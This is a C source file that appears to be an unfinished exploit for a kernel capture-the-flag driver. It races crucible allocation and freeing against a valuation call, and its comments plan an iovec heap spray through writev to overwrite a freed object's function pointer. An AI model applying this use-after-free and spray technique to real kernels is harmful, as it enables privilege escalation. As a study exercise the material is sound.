#include <stdio.h>
#include <pthread.h>
#include <sys/uio.h>
#include <string.h>
#include <unistd.h>

#include "lavalib.h"

#define CRUCIBLE_ID 0
#define IOVEC_ARRAY_SZ 3

int lava_fd = -1;

void overwrite_crucible(){
    struct iovec iovec_array[IOVEC_ARRAY_SZ]; //3 * 16 = 48
    

    memset(iovec_array, '\0', sizeof(iovec_array));

    int pipefd[2];
    if (pipe(pipefd)) {
        printf("[!] Failed to create pipe\n");
        //exit...
    }

    //will block
    writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);

}

void *thread_one_proc(void *_){
    printf("[+] Thread one running...\n");
    for(;;){
        //alloc a crucible
        new_crucible(
            lava_fd,
            CRUCIBLE_ID,
            0xff,
            0
        );
        //add elements to its linked list of pebbles for the valuer
        for(int i = 0; i < 0x10; i++){
            add_pebble(
                lava_fd,
                CRUCIBLE_ID,
                i,
                0x10,
                0x10
            );
        }
        incinerate(
            lava_fd,
            CRUCIBLE_ID
        );
    }
    return NULL;
}

void *thread_two_proc(void *_){
    printf("[+] Thread two running...\n");
    for(;;){
        assess_value(
            lava_fd,
            CRUCIBLE_ID
        );
    }
    return NULL;
}

// LAYOUT OF CRUCIBLE_T
// /* offset      |    size */  type = struct crucible_t {
// /*      0      |       2 */    uint16_t id;
// /*      2      |       1 */    uint8_t capacity;
// /* XXX  5-byte hole      */
// /*      8      |       8 */    long (*valuer)(uint16_t, uint16_t);
// /*     16      |      16 */    struct list_head {
// /*     16      |       8 */        struct list_head *next;
// /*     24      |       8 */        struct list_head *prev;
//                                    /* total size (bytes):   16 */
//                                } pebbles;
// /*     32      |      16 */    struct list_head {
// /*     32      |       8 */        struct list_head *next;
// /*     40      |       8 */        struct list_head *prev;
//                                    /* total size (bytes):   16 */
//                                } list;
//                                /* total size (bytes):   48 */
//                              }

// LAYOUT OF IOVEC
// /* offset      |    size */  type = struct iovec {
// /*      0      |       8 */    void *iov_base;
// /*      8      |       8 */    __kernel_size_t iov_len;
//                                /* total size (bytes):   16 */
//                              }

// So it will take 3x IOVEC to fill the slot left by CRUCIBLE_T
// id + capacity    |   iovec[0].iov_base
// valuer           |   iovec[0].iov_len
// pebbles.next     |   iovec[1].iov_base
// pebbles.prev     |   iovec[1].iov_len
// list.next        |   iovec[2].iov_base
// list.prev        |   iovec[2].iov_len


int main(int argc, char *argv[]){
    long ret = -1;
    pthread_t tids[2] = {-1,-1}; 

    lava_fd = get_handle();

    if(lava_fd < 0){
       printf("[!] Invalid lava_fd handle!\n");
       return -1;
    }

    ret = pthread_create(&(tids[0]), NULL, &thread_one_proc, NULL);
    ret = pthread_create(&(tids[1]), NULL, &thread_two_proc, NULL);

    pthread_join(tids[0], NULL);
    pthread_join(tids[0], NULL);

    close_handle(lava_fd);
    
    return 0;
}